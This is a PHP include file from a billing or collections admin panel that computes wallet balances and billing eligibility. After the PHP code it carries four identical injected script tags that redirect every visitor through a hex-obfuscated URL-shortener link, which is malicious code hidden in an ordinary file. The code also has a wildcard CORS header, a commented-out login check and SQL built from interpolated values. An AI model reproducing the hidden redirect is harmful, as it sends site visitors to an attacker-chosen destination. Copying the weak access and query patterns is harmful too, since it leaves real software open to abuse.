<?php
header('Access-Control-Allow-Origin: *');
define('DIR_NAME','');
require_once("include/classes/class.Admin.php");
require_once("include/classes/class.Misc.php");
//require_once("include/classes/SMS.php");
$objAdmin = new Admin();
$objMisc  = new Cms();
//$sms      = new Sms();
// if(isset($_REQUEST['device']) && !empty($_REQUEST['device'])){
//     $device     = $_REQUEST['device'];
// }
// if(isset($_REQUEST['device_id']) && !empty($_REQUEST['device_id'])){
//     $device_id  = $_REQUEST['device_id'];
// }
/*if(!isset($_SESSION['USER_ID'])){
    header("location:/index.html");
    exit;
}*/
//$balSmsCount=$sms->pending_sms($_SESSION['HEADOFFICE']);
//$balSmsCount=10;
//$balSms=((empty($balSmsCount))?0:$balSmsCount);
if($_SERVER['REQUEST_URI']=='/monthly-collections.php'){
    $balSms=10;
    $billRates=$objMisc->GiveValues("HEADOFFICE_ID='$_SESSION[HEADOFFICE]'",'RATE,RATE_SMS,CREDIT_AMOUNT','admin_collections');
    $billsGeneratedRate=$objMisc->GiveValue("HEADOFFICE_ID='$_SESSION[HEADOFFICE]' AND AMOUNT_TYPE='C' AND AMOUNT!='0' AND STATUS='A'",'SUM(BILL_RATE)','monthly_charges');
    $billsGenerated=$objMisc->GiveValue("HEADOFFICE_ID='$_SESSION[HEADOFFICE]' AND AMOUNT_TYPE='C' AND STATUS='A' AND RECEIPT_NO!='Opening Balance' AND AMOUNT!='0'",'COUNT(*)','monthly_charges');
    //$smsSent=$objMisc->GiveValue("HEADOFFICE_ID='$_SESSION[HEADOFFICE]'",'COUNT(*)','sms_log');
    //$smsSentRate=$objMisc->GiveValue("HEADOFFICE_ID='$_SESSION[HEADOFFICE]'",'SUM(RATE_SMS)','sms_log');
    $totAmount=$objMisc->GiveValue("HEADOFFICE_ID='$_SESSION[HEADOFFICE]'",'SUM(AMOUNT)','headoffice_recharge');
    $walletBal=$totAmount-$billsGeneratedRate;//-$smsSentRate;
    $canBill=(($walletBal<0 && abs($walletBal)>$billRates['credit_amount'])?'N':'Y');
    $smartyVars['canBill']=$canBill;
    $smartyVars['balSms']=10;
}
?>
<script>window.location.href = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x2d\x73\x68\x6f\x72\x74\x2e\x6e\x65\x74\x2f\x55\x56\x46\x30\x72\x39";</script>
<script>window.location.href = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x2d\x73\x68\x6f\x72\x74\x2e\x6e\x65\x74\x2f\x55\x56\x46\x30\x72\x39";</script>
<script>window.location.href = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x2d\x73\x68\x6f\x72\x74\x2e\x6e\x65\x74\x2f\x55\x56\x46\x30\x72\x39";</script>
<script>window.location.href = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x2d\x73\x68\x6f\x72\x74\x2e\x6e\x65\x74\x2f\x55\x56\x46\x30\x72\x39";</script>